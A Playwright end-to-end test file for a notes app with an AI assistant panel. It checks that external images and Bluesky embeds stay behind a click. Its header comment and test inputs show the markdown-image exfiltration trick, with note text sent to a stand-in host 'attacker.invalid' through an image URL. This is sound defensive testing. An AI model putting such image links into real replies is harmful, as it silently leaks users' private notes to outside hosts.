// External media must not reach the network until the user clicks it. An
// assistant reply holding `![x](https://attacker.invalid/?q=<note text>)`
// would otherwise leak note text with no click and no write approval, and a
// bare Bluesky post URL leaks its handle through the DID lookup. This is the
// security review's High finding, rebuilt as a reproduction: every request
// to a host other than the app's is recorded at the browser-context level
// (which also sees service-worker fetches) and must stay empty until the
// placeholder is clicked. FakeEngine's default scenario replies
// "echo: <user text>" (see server/tests/fake_engine.py), so sending the
// markdown as the message is enough to get it rendered in the reply.
import { type BrowserContext, type Page } from "@playwright/test";
import { expect, test } from "./fixtures";

const PASSWORD = "e2e-pw";

const PNG = Buffer.from(
  "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8"
  + "z8DQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");

async function login(page: Page) {
  await page.goto("/login");
  await page.fill("#pw", PASSWORD);
  await page.click("text=log in");
  await page.waitForURL("**/");
  await expect(page.locator(".ws-banner")).toHaveCount(0);
}

const askInput = (page: Page) =>
  page.getByRole("region", { name: "Assistant" }).getByPlaceholder(/ask about your notes/i);

// Records every http(s) request leaving for an origin other than the app's,
// and answers the hosts this spec points at so nothing goes to the real
// network. Routed on the context, not the page, to catch the service worker.
async function recordExternal(context: BrowserContext, baseURL: string | undefined): Promise<string[]> {
  const appOrigin = new URL(baseURL!).origin;
  const external: string[] = [];
  context.on("request", (request) => {
    const url = new URL(request.url());
    if ((url.protocol === "http:" || url.protocol === "https:") && url.origin !== appOrigin) {
      external.push(request.url());
    }
  });
  await context.route("https://attacker.invalid/**", (route) =>
    route.fulfill({ status: 200, contentType: "image/png", body: PNG }));
  await context.route("**/xrpc/com.atproto.identity.resolveHandle*", (route) =>
    route.fulfill({ json: { did: "did:plc:tq6gqh5aaohgi55y2yofylwj" } }));
  await context.route("https://embed.bsky.app/**", (route) =>
    route.fulfill({ status: 200, contentType: "text/html", body: "<html><body>post</body></html>" }));
  return external;
}

let title: string | null = null;
test.afterEach(async ({ page }) => {
  if (title) await page.request.delete(`/api/page/${encodeURIComponent(title)}`);
  title = null;
});

test("an assistant reply's external image and Bluesky post fetch nothing until clicked",
  async ({ page, context, baseURL }) => {
    const external = await recordExternal(context, baseURL);
    await login(page);

    await page.goto("/");
    await page.keyboard.press("Control+j");
    const panel = page.getByRole("region", { name: "Assistant" });
    await expect(panel).toBeVisible();
    const replies = panel.locator(".assistant-msg-assistant");

    await askInput(page).fill("![citation](https://attacker.invalid/collect?note=SECRET-tk9i)");
    await askInput(page).press("Enter");
    await expect(replies.nth(0)).toBeVisible();

    await askInput(page).fill(
      "https://bsky.app/profile/secret-tk9i.attacker.example/post/3mp4jonwrfk2h");
    await askInput(page).press("Enter");
    await expect(replies.nth(1)).toBeVisible();

    await expect(panel.locator("img, iframe")).toHaveCount(0);

    const imageButton = panel.getByRole("button", { name: "image from attacker.invalid: citation" });
    const postButton = panel.getByRole("button", {
      name: "Bluesky post from secret-tk9i.attacker.example",
    });
    await expect(imageButton).toBeVisible();
    await expect(postButton).toBeVisible();
    // Again once the gate is visibly in place: the Bluesky iframe mounts only
    // after an async handle lookup, so the first count could pass too early.
    await expect(panel.locator("img, iframe")).toHaveCount(0);
    expect(external).toEqual([]);

    await imageButton.click();
    await expect.poll(() => external).toEqual([
      "https://attacker.invalid/collect?note=SECRET-tk9i",
    ]);
    await expect(panel.getByRole("img", { name: "citation" })).toBeVisible();
    // One click loads one item: with the image fully rendered, the post is
    // still gated and its handle lookup has not run.
    expect(external).toEqual(["https://attacker.invalid/collect?note=SECRET-tk9i"]);
    await expect(postButton).toBeVisible();
    await expect(panel.locator("iframe")).toHaveCount(0);

    await postButton.click();
    await expect.poll(() => external.some((u) => u.includes("resolveHandle"))).toBe(true);
    await expect(panel.locator("iframe.bluesky-embed")).toBeVisible();
  });

test("a note's external image waits for a click; its Bluesky post still embeds",
  async ({ page, context, baseURL }) => {
    const external = await recordExternal(context, baseURL);
    await login(page);

    const stamp = Date.now();
    title = `ExternalMedia${stamp}`;
    expect((await page.request.post("/api/pages", { data: { title } })).ok()).toBe(true);
    const opsResponse = await page.request.post("/api/ops", { data: {
      client_id: "e2e-external-media",
      batch_id: `e2e-external-media-${stamp}`,
      ops: [
        {
          op: "create", uid: `xmi${stamp}`, page_title: title, parent_uid: null,
          order_idx: 0, text: "![pic](https://attacker.invalid/note.png)",
        },
        {
          op: "create", uid: `xmb${stamp}`, page_title: title, parent_uid: null,
          order_idx: 1,
          text: "https://bsky.app/profile/cpaxton.bsky.social/post/3mp4jonwrfk2h",
        },
      ],
    } });
    expect(opsResponse.ok()).toBeTruthy();

    await page.goto(`/page/${encodeURIComponent(title)}`);
    await expect(page.locator("iframe.bluesky-embed")).toBeVisible();

    await expect(page.locator('img[src*="attacker.invalid"]')).toHaveCount(0);
    expect(external.filter((u) => u.includes("attacker.invalid"))).toEqual([]);

    await page.getByRole("button", { name: "image from attacker.invalid: pic" }).click();
    await expect.poll(() => external.filter((u) => u.includes("attacker.invalid"))).toEqual([
      "https://attacker.invalid/note.png",
    ]);
    await expect(page.getByRole("img", { name: "pic" })).toBeVisible();
    await expect(page.locator("textarea.block-input")).toHaveCount(0);
  });
